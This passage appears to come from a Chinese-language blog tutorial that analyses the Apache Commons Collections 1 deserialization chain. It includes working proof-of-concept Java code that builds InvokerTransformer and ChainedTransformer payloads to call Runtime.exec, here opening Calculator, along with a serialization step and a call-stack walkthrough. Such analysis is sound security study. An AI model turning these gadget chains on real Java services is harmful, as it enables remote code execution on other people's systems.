org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里借用<a href="https://xz.aliyun.com/u/20851" target="_blank" rel="noopener">lalajun</a>总结的3要素：</p><blockquote><ol><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…）</li></ol></blockquote><p>把断点下在setValue点处，查看调用栈：</p><p>先进入1次ConstantTransformer.class:</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911105729719.png" alt="image-20200911105729719"></p><p>3次InvokerTransformer.class：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911105741271.png" alt="image-20200911105741271"></p><p>有两种，这里是由于<code>org.apache.commons.collections.functors.ChainedTransformer#transform</code>这个函数内部的循环有很多细节：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">            <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h2><p><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);<span class="comment">//进入此处</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p><p>TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);<span class="comment">//进入此处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>org.apache.commons.collections.functors.ChainedTransformer#transform</code></p><p>由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">          <span class="comment">//循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class</span></span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">          <span class="comment">//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来仔细看这个循环，首先用IDEA查看我们传进来的这个参数iTransformers这个数组：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911111831007.png" alt="image-20200911111831007"></p><p><code>org.apache.commons.collections.functors.ConstantTransformer#transform</code></p><p>首先第一次进入transform函数，它返回的是<code>class java.lang.Runtime</code>这个类对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911113736984.png" alt="image-20200911113736984"></p><p>从第二次循环开始，就会进入<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>了，可以看到这次进入<code>transform</code>函数的参数object就变成了上一次返回的<code>class java.lang.Runtime</code>。</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911140710656.png" alt="image-20200911140710656"></p><p>仔细看这次的<code>transform</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//获取input对象的class</span></span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                <span class="comment">//根据iMethodName、iParamTypes选择cls中的一个方法</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="comment">//根据iArgs参数调用这个方法</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>重点来了！！！</strong></p><p>可以看到代码中直接就调用了invoke方法，调用一系列参数，这就是触发点，接下来仔细看。</p><p>明显的反射机制，可见<strong>InvokerTransformer</strong>就是我们的触发任意代码执行处，看看源码中的文件描述：<br>先看看我们需要关注的<code>InvokerTransformer</code>类的描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> 通过反射机制创建一个新的对象实例的转换器实现</span></span><br></pre></td></tr></table></figure><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map.Entry 类型setValue(<span class="string">"foobar"</span>)</span><br><span class="line">=&gt; AbstracInputCheckedMapDecorator.setValue()</span><br><span class="line">=&gt; TransformedMap.checkSetValue()</span><br><span class="line">=&gt; ChainedTransformer.transform(Object object)</span><br><span class="line">    根据数组，先进入 =&gt; ConstantTransformer.transform(Object input)</span><br><span class="line">    再进入 =&gt; InvokerTransformer.transform(Object input)</span><br></pre></td></tr></table></figure><h1 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h1><p>目标：</p><p>首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><ul><li>Runtime.getRuntime：获取一个Runtime的实例</li><li>exec()：调用实例的exec函数</li></ul><p>因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">.<span class="title">invoke</span>(</span></span><br><span class="line">Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例</span><br><span class="line">,</span><br><span class="line"><span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="第一步：InvokerTransformer"><a href="#第一步：InvokerTransformer" class="headerlink" title="第一步：InvokerTransformer"></a>第一步：InvokerTransformer</h2><p>再回看反射机制触发函数<code>InvokerTransformer</code>类的<code>transform(Object input)</code>（做了简化处理，只留取重点部分）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure><p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"><span class="keyword">this</span>.iMethodName=<span class="string">"exec"</span></span><br><span class="line"><span class="keyword">this</span>.iParamTypes=String<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">this</span>.<span class="title">iArgs</span></span>=<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br></pre></td></tr></table></figure><p>那么在<code>InvokerTransformer</code>类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下测试代码直接调用InvokerTransformer通过反射执行任意命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">            new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//构造input</span></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//执行</span></span><br><span class="line">    a.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接成功:)</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/image-20200911155908541.png" alt="image-20200911155908541"></p><h2 id="第二步-ChainedTransformer"><a href="#第二步-ChainedTransformer" class="headerlink" title="第二步 ChainedTransformer"></a>第二步 ChainedTransformer</h2><p>弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：</p><ul><li>为了方便，攻击者受害者写在同一函数中</li><li>使用文件写入，代替网络传输</li></ul><blockquote><p>由于InvokerTransformer继承了Serializable类，是可以成功序列化的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//模拟攻击</span></span><br><span class="line">    <span class="comment">//1.客户端构造序列化payload，使用写入文件模拟发包攻击</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">            <span class="string">"exec"</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">            new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line"></span><br><span class="line">    FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">    ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">    fout.writeObject(a);</span><br><span class="line">    <span class="comment">//2.服务端从文件中读取payload模拟接受包，然后触发漏洞</span></span><br><span class="line">    <span class="comment">//服务端反序列化payload读取</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">    <span class="comment">//神奇第一处：服务端需要自主构造恶意input</span></span><br><span class="line">        Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line">    <span class="comment">//神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input</span></span><br><span class="line">        InvokerTransformer a_in = (InvokerTransformer) fin.readObject();</span><br><span class="line">        a_in.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：</p><ol><li>帮我们写一个payload作为input；</li><li>接受客户端输入参数，反序列化成InvokerTransformer类</li><li>再刻意调用InvokerTransformer类的transform函数</li></ol><p>实际上…..只有开发人员是自己人的情况下才满足条件吧……</p><p>所以我们面临一些问题：</p><ol><li>payload肯定需要在客户端可以自定义构造，再传输进入服务端</li><li>服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类</li><li>并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）</li><li>如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</li></ol><blockquote><p>这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。<br>但是对于服务端版本环境是有要求的，之后会说到</p></blockquote><p>那么我们一个个来解决问题：首先使客户端自定义paylaod！</p><p>下面我们需要关注<strong>ChainedTransformer</strong>这个类,首先看一下这个类的描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;</span></span><br><span class="line"><span class="comment">    * The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment">    * is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    将指定的转换器连接在一起的转化器实现。</span></span><br><span class="line"><span class="comment">    输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推</span></span><br></pre></td></tr></table></figure><p>可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是<strong>ChainedTransformer</strong>类的<code>transform</code>函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">        * </span></span><br><span class="line"><span class="comment">        * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">        * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">          <span class="comment">//熟悉，这就是刚才上面提到的循环</span></span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p><p>首先确定iTransformers可控，<strong>iTransformers数组</strong>是通过<strong>ChainedTransformer</strong>类的<strong>构造函数</strong>赋值的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment">     * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> transformers  the transformers to chain, not copied, no nulls</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();<span class="comment">//这个super不清楚做了啥，</span></span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么我们知道可以自定义iTransformers的内容，我们已有条件如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最终执行目标</span></span><br><span class="line">    Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line">    .getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    .<span class="title">invoke</span>(</span></span><br><span class="line">    Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例</span><br><span class="line">    ,</span><br><span class="line">    <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">//InvokeTransformer关键语句：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再看到InvokeTransformer代码我们需要<strong>引出一个注意点</strong>：</p><blockquote><p>这里我们需要注意到<code>input.getClass()</code>这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>可以使用如下代码验证，这里不再赘述</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object a = Runtime.getRuntime();</span><br><span class="line">    Class b = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">    System.out.println(a.getClass());</span><br><span class="line">    System.out.println(b.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//结果</span></span><br><span class="line">    <span class="comment">//class java.lang.Runtime</span></span><br><span class="line">    <span class="comment">//class java.lang.Class</span></span><br></pre></td></tr></table></figure><p>基于之前写的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只调用InvokeTransformer的情况如下：</span></span><br><span class="line">    InvokerTransformer a = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;);</span><br><span class="line"></span><br><span class="line">    Object input=Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure><p>我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。</p><p>先把a封装成ChainedTransformer格式，但是payload还是在外面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 